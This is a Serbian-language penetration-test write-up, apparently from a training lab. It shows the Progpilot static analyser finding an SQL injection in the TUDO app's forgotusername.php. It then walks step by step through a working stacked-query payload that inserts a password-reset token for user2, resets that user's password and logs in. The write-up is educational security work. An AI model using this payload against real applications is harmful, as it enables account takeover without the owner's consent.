# 🔍 Progpilot — Kako nam je pomogao da pronađemo Login Bypass

> **TUDO Aplikacija** | Login Bypass za korisnika `user2`  
> Ranjivost: SQL Injection u `forgotusername.php`

---

## Šta je Progpilot i zašto smo ga koristili?

Kada imamo izvorni kod aplikacije (whitebox test), možemo koristiti alate za **statičku analizu** — oni automatski čitaju kod i traže bezbednosne probleme, bez da aplikacija mora da se pokrene.

**Progpilot** je alat koji koristi **taint analysis** — prati korisnički unos kroz kod:

```
$_POST['username']  →  (bez validacije?)  →  pg_query()
     ↑                                            ↑
  IZVOR (Source)                            PONOR (Sink)
  korisnički unos                        opasna SQL funkcija

Ako postoji direktna veza bez validacije = RANJIVOST ✅
```

Bez ovog alata morali bismo **ručno čitati svaki PHP fajl** u aplikaciji. Progpilot je to uradio automatski za nekoliko sekundi.

---

## Korak 1 — Pokretanje Progpilota

Komanda koja je pokrenuta:

```bash
# Kopiranje alata u Docker kontejner
docker cp progpilot_v1.3.0.phar tudo-app:/var/www/html/

# Pokretanje analize nad celom aplikacijom
docker exec -it tudo-app php /var/www/html/progpilot_v1.3.0.phar /var/www/html
```

| Deo komande | Šta radi |
|-------------|----------|
| `docker exec -it tudo-app` | Uđi u Docker kontejner |
| `php progpilot_v1.3.0.phar` | Pokreni Progpilot alat |
| `/var/www/html` | Analiziraj celu aplikaciju |

**📸 Progpilot se kopira i pokreće — početak rezultata:**

![Progpilot pokretanje](slika1.jpg)

---

## Korak 2 — Šta nam je Progpilot rekao?

U rezultatima se pojavio ovaj nalaz:

```json
{
    "source_name": "$username",
    "source_file": "forgotusername.php",
    "source_line": 9,
    "sink_name": "pg_query",
    "sink_line": 12,
    "sink_file": "forgotusername.php",
    "vuln_name": "sql_injection",
    "vuln_cwe": "CWE_89"
}
```

**Šta nam ovo govori:**

| Polje | Vrednost | Značenje |
|-------|----------|----------|
| `source_name` | `$username` | Korisnički unos — niko ga nije validirao |
| `source_file` | `forgotusername.php` | U ovom fajlu počinje problem |
| `sink_name` | `pg_query` | Taj unos završava u SQL upitu! |
| `vuln_name` | `sql_injection` | Tip ranjivosti — SQL Injection |
| `vuln_cwe` | `CWE_89` | Zvanična klasifikacija ranjivosti |

**📸 Progpilot nalazi SQL Injection u forgotusername.php:**

![Progpilot SQLi nalaz](slika2.jpg)

---

## Korak 3 — Potvrda u kodu

Nakon što nam je Progpilot rekao gde da gledamo, otvorili smo fajl:

```bash
docker exec -it tudo-app cat /var/www/html/forgotusername.php
```

Ranjiva linija koda (linija 12):

```php
$username = $_POST['username'];  // ← korisnički unos, BEZ validacije

$ret = pg_query($db, "select * from users where username='".$username."';");
//                                                           ↑↑↑↑↑↑↑↑↑
//                                    direktna konkatenacija — RANJIVO!
```

**📸 Ranjivi kod u terminalu:**

![Ranjivi kod](slika3.jpg)

Progpilot nam je tačno pokazao: `$username` (linija 9) putuje direktno do `pg_query()` (linija 12) — napadač može ubaciti sopstveni SQL.

---

## Kako smo iskoristili ranjivost za Login Bypass (user2)

### Korak 4 — Otvaranje forme

```
http://localhost:8000/forgotusername.php
```

**📸 Prazna forma pre unosa:**

![Forma prazna](rb1.jpg)

---

### Korak 5 — Unos SQL Injection payloada

U polje Username ubačen je:

```sql
' ; INSERT INTO tokens (uid, token) VALUES (3, 'user2token'); --
```

Zašto `uid=3`? Videli smo u admin panelu da je raspored:
- uid=1 → admin
- uid=2 → user1  
- uid=3 → **user2** ← naš cilj

**📸 Payload unet u formu:**

![Payload unet](rb2.jpg)

**Šta se dešava u bazi podataka:**

```sql
-- Originalni upit koji aplikacija formira:
select * from users where username='';
INSERT INTO tokens (uid, token) VALUES (3, 'user2token');
-- '

-- ; završava originalni SELECT
-- INSERT ubacuje naš token u bazu
-- -- komentariše ostatak
```

---

### Korak 6 — Odgovor aplikacije

Aplikacija prikazuje **"User doesn't exist"** crvenim slovima.

**Ovo izgleda kao greška — ali token je već ubačen u bazu!**

`pg_query()` izvršava oba upita, ali vraća rezultat samo poslednjeg. SELECT nije našao korisnika → greška. Ali INSERT je prošao uspešno.

**📸 "User doesn't exist" — ali token je ubačen:**

![User doesnt exist](rb3.jpg)

---

### Korak 7 — Pristup reset stranici

```
http://localhost:8000/resetpassword.php?token=user2token
```

`resetpassword.php` proverava da li token postoji u bazi — postoji! Forma za novu lozinku se prikazuje.

**📸 Reset stranica — token je validan (URL vidljiv u browseru):**

![Reset token](rb4.jpg)

---

### Korak 8 — Resetovanje lozinke

Nova lozinka: `newpass123`

**📸 "Password changed!" — lozinka promenjena:**

![Password changed](rb5.jpg)

---

### Korak 9 — Login kao user2

```
http://localhost:8000/login.php
Username: user2
Password: newpass123
```

**📸 Login forma popunjena:**

![Login forma](rb6.jpg)

---

### Korak 10 — Uspešan Login Bypass! ✅

**📸 Ulogovani kao user2 — bez poznavanja originalne lozinke:**

![Uspesno ulogovan](rb7.jpg)

---

## Zaključak — Zašto je Progpilot bio ključan?

```
Progpilot analizira kod
        ↓
Pronalazi: $username → pg_query() bez validacije
        ↓
Mi otvaramo forgotusername.php i potvrđujemo
        ↓
Ubacujemo SQL payload → INSERT token u bazu
        ↓
Koristimo token → resetujemo lozinku user2
        ↓
Login kao user2 bez poznavanja lozinke ✅
```

**Bez Progpilota:** morali bismo ručno čitati sve PHP fajlove i tražiti ranjive funkcije.

**Sa Progpilotom:** za nekoliko sekundi smo tačno znali u kom fajlu i u kojoj liniji je ranjivost.

---

*TUDO Aplikacija | Whitebox Penetration Test | Login Bypass*